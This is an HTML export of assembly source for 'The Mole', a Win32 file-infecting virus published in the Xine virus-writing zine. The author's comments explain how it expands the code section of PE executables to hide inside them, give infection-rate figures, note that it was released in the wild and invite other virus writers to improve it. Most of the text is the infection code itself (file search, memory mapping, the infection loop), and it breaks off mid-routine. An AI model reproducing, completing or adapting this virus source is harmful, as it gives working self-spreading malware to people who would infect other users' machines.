<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #4 - Phile 200 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">

</span><span class="sc1">;The Mole by Murkry\ikx</span><span class="sc0">
</span><span class="sc1">;A small win32 virus that uses memmap to expand the code section of a</span><span class="sc0">
</span><span class="sc1">;.exe then place its code there. Does not work on some Win98 files since</span><span class="sc0">
</span><span class="sc1">;MS in its infinite wisdom has made file aligment 1000h instead of 200h</span><span class="sc0">
</span><span class="sc1">;of course this makes this type of virus redunant since you do not need</span><span class="sc0">
</span><span class="sc1">;to expand the section odds are the file will have 400-800h bytes free anyway</span><span class="sc0">
</span><span class="sc1">;so the day of cavity infectors has come in the form of Win98 but sadly</span><span class="sc0">
</span><span class="sc1">;this virus does not infect Win98 type files. But it does infect WinNT</span><span class="sc0">
</span><span class="sc1">;A relative small change in code should rectify this.</span><span class="sc0">
</span><span class="sc1">;if the file infect mask is changed to *.dll it will work and if then</span><span class="sc0">
</span><span class="sc1">;return to *.exe it returns. This would be a interesting change for other</span><span class="sc0">
</span><span class="sc1">;students of vx to explore.</span><span class="sc0">

</span><span class="sc1">;Tested in NT and Win95 works very well</span><span class="sc0">
</span><span class="sc1">;size just under 400h to get the date resest and control attributes</span><span class="sc0">
</span><span class="sc1">;it would need to be bigger say 600h, actaul less but 200h should the</span><span class="sc0">
</span><span class="sc1">;smallest increment you use for this type of virus </span><span class="sc0">

</span><span class="sc1">;A quick survey off 30 PE file in a win95 directory shows</span><span class="sc0">
</span><span class="sc1">; possible percent of files that can be infected versus size of</span><span class="sc0">
</span><span class="sc1">;virus of this type</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    400h       83%   </span><span class="sc0">
</span><span class="sc1">;    600h       60%</span><span class="sc0">
</span><span class="sc1">;    800h       50%</span><span class="sc0">
</span><span class="sc1">;    a00h       37%</span><span class="sc0">
</span><span class="sc1">;    c00h       20%</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;what am I actual doing here and why does it fail if filealign is 100h</span><span class="sc0">
</span><span class="sc1">;well in win32 you can asgin filealigment to 200h or 1000h</span><span class="sc0">
</span><span class="sc1">; (not sure if other values will work but this are the 200 that MS uses)</span><span class="sc0">
</span><span class="sc1">;now if you fileAL = 200h and the MemoryAligment = 1000h this means</span><span class="sc0">
</span><span class="sc1">;your file is bigger in memory then what it takes on the disk.</span><span class="sc0">
</span><span class="sc1">;Eaxmple</span><span class="sc0">
</span><span class="sc1">;TASM  file do nothing but Exit Process</span><span class="sc0">
</span><span class="sc1">;On Disk                             |In Memory</span><span class="sc0">
</span><span class="sc1">;0      MZ                           |RVA +0    MZ</span><span class="sc0">
</span><span class="sc1">;100h   PE                           |     100h PE</span><span class="sc0">
</span><span class="sc1">;600h   FIRST SECTION                |    1000h FIRST SECTION</span><span class="sc0">
</span><span class="sc1">;800h   Second section               |    2000h Second SECTION</span><span class="sc0">
</span><span class="sc1">;A00h   third section                |    3000h THIRD SECTION</span><span class="sc0">
</span><span class="sc1">;C00h   fourth section               |    4000h FOUURTH SECTION</span><span class="sc0">
</span><span class="sc1">;somtimes som padding of 200h in size|</span><span class="sc0">
</span><span class="sc1">;This means there is memory space that is unused, Some Virus have already use</span><span class="sc0">
</span><span class="sc1">;some of this space 2 of my virus</span><span class="sc0">
</span><span class="sc1">;Murkry- which uses the space wasted on file and memory In the Header area</span><span class="sc0">
</span><span class="sc1">;DarkSide- which use the space in the data section</span><span class="sc0">
</span><span class="sc1">;Well with memmap API's you can rearrnange the file to increase the file space</span><span class="sc0">
</span><span class="sc1">;available on disk but not increase the space in memory, this is important due</span><span class="sc0">
</span><span class="sc1">;how pe files execute its code all relocs are hardcode to be at rva + VA of section</span><span class="sc0">
</span><span class="sc1">;if you were to move the section in memory you then need to adjust all the</span><span class="sc0">
</span><span class="sc1">;relocs, which can be done but is a pain.If you assume some limits to your file</span><span class="sc0">
</span><span class="sc1">;size then you can increase the file size with out increasing memory size</span><span class="sc0">
</span><span class="sc1">;Eaxample of Infect file</span><span class="sc0">
</span><span class="sc1">;On Disk                             |In Memory</span><span class="sc0">
</span><span class="sc1">;0      MZ                           |RVA +0    MZ</span><span class="sc0">
</span><span class="sc1">;100h   PE                           |     100h PE</span><span class="sc0">
</span><span class="sc1">;600h   FIRST SECTION                |    1000h FIRST SECTION</span><span class="sc0">
</span><span class="sc1">; Virus here                         |    1800h virus here</span><span class="sc0">
</span><span class="sc1">;800h   Second section               |    2000h Second SECTION</span><span class="sc0">
</span><span class="sc1">;A00h   third section                |    3000h THIRD SECTION</span><span class="sc0">
</span><span class="sc1">;C00h   fourth section               |    4000h FOUURTH SECTION</span><span class="sc0">
</span><span class="sc1">;now you do need to adjust the physcal offset of each Section in their respective</span><span class="sc0">
</span><span class="sc1">;section entrys but thats maybe 4 or 6 spots if you need to update relocs it could</span><span class="sc0">
</span><span class="sc1">;several hundred, and if the .reloc section was stripped from the file good luck</span><span class="sc0">
</span><span class="sc1">;anyway this method of infection also means you do not have to adjust the</span><span class="sc0">
</span><span class="sc1">;charteristcs of a section to code since you are infecting the code section</span><span class="sc0">
</span><span class="sc1">;well I am sure that is clear as mud....</span><span class="sc0">
</span><span class="sc1">;oh yeah if the file it is infecting it has say greater then 800h of</span><span class="sc0">
</span><span class="sc1">;free space then the virus will reinfect, which means that the virus will</span><span class="sc0">
</span><span class="sc1">;now get twice as many chances to infect when this file it executed :&gt;</span><span class="sc0">
</span><span class="sc1">;I do some weird code down below among other things I leave info on the</span><span class="sc0">
</span><span class="sc1">;stack soe I can use it later, I also do some weird jmps when memmaping</span><span class="sc0">
</span><span class="sc1">;the first time throuhg I memmap at files true size , then if its not infected</span><span class="sc0">
</span><span class="sc1">;and can be I unmap and run thru the same code to map with the new size</span><span class="sc0">
</span><span class="sc1">; hey it works , looks like vogon poetry but it works</span><span class="sc0">
</span><span class="sc1">;as a side not I released this virus to the now Defucnt Vicodin TNN site</span><span class="sc0">
</span><span class="sc1">;and AVP calls it IKX, with really was meant to be called the TheMole since</span><span class="sc0">
</span><span class="sc1">;it burrowed into the file,</span><span class="sc0">
</span><span class="sc1">;Oh the reason this cant infect Win98 files, some to all of them (win98 files)</span><span class="sc0">
</span><span class="sc1">;have file alignments set to 1000h (for faster load time, I hear) All</span><span class="sc0">
</span><span class="sc1">;win98 files have been requested to be compiled at that size. So when this</span><span class="sc0">
</span><span class="sc1">;virus checks for free space it will find all sections end at a 1000h increment</span><span class="sc0">
</span><span class="sc1">;which means there is no free space.</span><span class="sc0">
</span><span class="sc1">;So what someone needs to do is modify this so instead of expanding files</span><span class="sc0">
</span><span class="sc1">;it checks to free space in the code section and writes itself there</span><span class="sc0">
</span><span class="sc1">;this virus would be like a snail or crab that uses the discard shells to</span><span class="sc0">
</span><span class="sc1">;house itself so code name TheSnail98 , Thats why I say the future of</span><span class="sc0">
</span><span class="sc1">;cavity infectors is near.. Since I hear WinNT aka Win2000 will also</span><span class="sc0">
</span><span class="sc1">;have this feature. Thank God Hard Drives are cheap.</span><span class="sc0">
</span><span class="sc1">;Murkry</span><span class="sc0">

</span><span class="sc1">;To assemble</span><span class="sc0">
</span><span class="sc1">;tasm32 /ml /m3 mole;</span><span class="sc0">
</span><span class="sc1">;tlink32 /Tpe /aa /c /x  mole,mole,, import32.lib,  </span><span class="sc0">


</span><span class="sc5">ViriiSize</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">400h</span><span class="sc0">

</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">stdcall</span><span class="sc0">
</span><span class="sc1">;Yeah I know they are not needed now :&gt;</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">GetFileSize</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">CreateFileMappingA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">MapViewOfFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">UnmapViewOfFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">FindFirstFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">FindNextFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">FindClose</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">SetEndOfFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc5">FILE_MAP_COPY</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">             </span><span class="sc2">000000001h</span><span class="sc0">
</span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">             </span><span class="sc2">000000002h</span><span class="sc0">
</span><span class="sc5">FILE_MAP_READ</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">             </span><span class="sc2">000000004h</span><span class="sc0">
</span><span class="sc5">FILE_MAP_ALL_ACCESS</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">             </span><span class="sc2">0000f001fh</span><span class="sc0">


</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">        </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">             </span><span class="sc2">000000080h</span><span class="sc0">

</span><span class="sc5">GENERIC_READ</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">40000000h</span><span class="sc0">

</span><span class="sc5">OPEN_EXISTING</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">

</span><span class="sc5">PAGE_NOACCESS</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">             </span><span class="sc2">000000001h</span><span class="sc0">
</span><span class="sc5">PAGE_READONLY</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">             </span><span class="sc2">000000002h</span><span class="sc0">
</span><span class="sc5">PAGE_READWRITE</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">             </span><span class="sc2">000000004h</span><span class="sc0">
</span><span class="sc5">PAGE_WRITECOPY</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">             </span><span class="sc2">000000008h</span><span class="sc0">
</span><span class="sc5">PAGE_EXECUTE</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">             </span><span class="sc2">000000010h</span><span class="sc0">
</span><span class="sc5">PAGE_EXECUTE_READ</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">             </span><span class="sc2">000000020h</span><span class="sc0">
</span><span class="sc5">PAGE_EXECUTE_READWRITE</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">             </span><span class="sc2">000000040h</span><span class="sc0">
</span><span class="sc5">PAGE_EXECUTE_WRITECOPY</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">             </span><span class="sc2">000000080h</span><span class="sc0">
</span><span class="sc1">;Header Offsets</span><span class="sc0">

</span><span class="sc5">PEHeaderSze</span><span class="sc0">             </span><span class="sc9">EQU</span><span class="sc0">             </span><span class="sc2">0F8h</span><span class="sc0">
</span><span class="sc5">NumOfSects</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0">             </span><span class="sc2">06h</span><span class="sc0">
</span><span class="sc5">SizeOfCode</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">             </span><span class="sc2">1ch</span><span class="sc0">
</span><span class="sc5">ImageSze</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">             </span><span class="sc2">50h</span><span class="sc0">



</span><span class="sc1">;section offsets</span><span class="sc0">
</span><span class="sc5">VSize</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">8h</span><span class="sc0">
</span><span class="sc5">VAddress</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0Ch</span><span class="sc0">
</span><span class="sc5">SzeRawData</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">PtrRawData</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">14h</span><span class="sc0">
</span><span class="sc5">HdrSze</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">28h</span><span class="sc0">

</span><span class="sc5">Find_data</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">139h</span><span class="sc0">
</span><span class="sc5">Find_data_name</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2ch</span><span class="sc0">     </span><span class="sc1">;where in the structure is the name</span><span class="sc0">
</span><span class="sc5">FileSizeH</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">     </span><span class="sc1">;if not zero get out      </span><span class="sc0">
</span><span class="sc5">Filesize</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">     </span><span class="sc1">;file size low</span><span class="sc0">
</span><span class="sc1">;find_file       db      Find_data dup(00)    ;size of the find data</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------</span><span class="sc0">
</span><span class="sc1">;how the stack is used</span><span class="sc0">
</span><span class="sc5">SHandle</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;Handle for the search routine</span><span class="sc0">
</span><span class="sc5">FHandle</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">SHandle</span><span class="sc0">  </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">     </span><span class="sc1">;Handle for open file</span><span class="sc0">
</span><span class="sc5">CMHandle</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">FHandle</span><span class="sc0">  </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">     </span><span class="sc1">;CreateMFileHandle</span><span class="sc0">
</span><span class="sc5">MHandle</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">CMHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">;Mhandle also address of where it is</span><span class="sc0">
</span><span class="sc5">FindFile</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">MHandle</span><span class="sc0">  </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">CFile</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">FindFile</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Find_data</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">CFMap</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">CFile</span><span class="sc0">    </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">MapV</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">CFMap</span><span class="sc0">    </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">CloseH</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">MapV</span><span class="sc0">     </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">FindFirst</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">CloseH</span><span class="sc0">   </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">FindNext</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">FindFirst</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">CloseFnd</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">FindNext</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">UnMapV</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">CloseFnd</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">SetFEnd</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">UnMapV</span><span class="sc0">   </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> 
</span><span class="sc5">Flag</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">SetFEnd</span><span class="sc0">  </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">

</span><span class="sc5">GetProc</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">Flag</span><span class="sc0">     </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">K32Load</span><span class="sc0">         </span><span class="sc9">Equ</span><span class="sc0">     </span><span class="sc5">GetProc</span><span class="sc0">  </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">HostPE</span><span class="sc0">          </span><span class="sc9">Equ</span><span class="sc0">     </span><span class="sc5">K32Load</span><span class="sc0">  </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">HostLoad</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">HostPE</span><span class="sc0">   </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">Delta</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">HostLoad</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">WorkSpace</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">GetProc</span><span class="sc0"> 


</span><span class="sc1">;-------------------------------------------</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">                                   </span><span class="sc1">;the data area</span><span class="sc0">
</span><span class="sc5">dummy</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;this needs some data</span><span class="sc0">
                                        </span><span class="sc1">;or it won't compile ...easily</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">                                    

</span><span class="sc5">Mole</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">68h</span><span class="sc0">
</span><span class="sc5">HostEip</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fini</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0">  </span><span class="sc2">00400000h</span><span class="sc0">

                </span><span class="sc6">Pusha</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAddie</span><span class="sc0">        </span><span class="sc1">;this leaves some data on the stack</span><span class="sc0">
                                        </span><span class="sc1">;which mole use's which I know upsets</span><span class="sc0">
                                        </span><span class="sc1">;some Purists out there</span><span class="sc0">
                                        </span><span class="sc1">;Hey it drove me nuts, till I work</span><span class="sc0">
                                        </span><span class="sc1">;out the stack offsets too</span><span class="sc0">
</span><span class="sc5">D1</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">WorkSpace</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">D1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Mole</span><span class="sc0">
                        </span><span class="sc1">;this gives mole its location in memory</span><span class="sc0">

                 </span><span class="sc1">;set return up to old eip</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">HostPE</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">
                 
                </span><span class="sc6">Call</span><span class="sc0">   </span><span class="sc5">GetFunctions</span><span class="sc0">    </span><span class="sc1">;With the k32 module</span><span class="sc0">
                                       </span><span class="sc1">;and GetProc we can now get all</span><span class="sc0">
                                       </span><span class="sc1">;the Fuctions we want</span><span class="sc0">

                </span><span class="sc1">;FINDFIRST</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc4">]</span><span class="sc0">

 
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fmask</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Mole</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindFirst</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">NoFiles</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                    
                  
</span><span class="sc5">TryItAgain</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Flag</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;assume too small</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Map_Infect?</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Flag</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FindNextOne</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindFile</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">Filesize</span><span class="sc4">],</span><span class="sc5">ViriiSize</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Map_Infect?</span><span class="sc0">

                </span><span class="sc1">;call    Modify</span><span class="sc0">

</span><span class="sc5">FindNextOne</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;FINDNEXT</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SHandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindNext</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">TryItAgain</span><span class="sc0">


</span><span class="sc5">NoFiles</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindFile</span><span class="sc4">]</span><span class="sc0">
